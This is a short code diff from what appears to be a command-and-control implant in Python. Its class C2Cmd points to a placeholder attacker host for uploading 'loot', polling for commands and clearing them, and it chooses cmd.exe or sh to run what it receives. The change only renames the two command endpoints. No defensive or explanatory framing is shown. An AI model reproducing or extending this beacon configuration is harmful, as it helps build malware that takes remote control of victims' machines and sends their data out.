@@ -7,8 +7,8 @@ class C2Cmd:
     def __init__(self):
         self.delay = 10  # delay in seconds
         self.url = "https://YOURHOST/exploit/c2/loot.php"
-        self.clearcheck = "https://YOURHOST/exploit/c2/2c.php?get=1"
-        self.cmdcheck = "https://YOURHOST/exploit/c2/c2.txt"
+        self.clearcheck = "https://YOURHOST/exploit/c2/clear-c2cmd.php?get=1"
+        self.cmdcheck = "https://YOURHOST/exploit/c2/c2cmd.txt"
         self.exe = "cmd.exe" if platform.system().lower().startswith("win") else "sh"
         self.swtch = "/C" if platform.system().lower().startswith("win") else "-c"
 
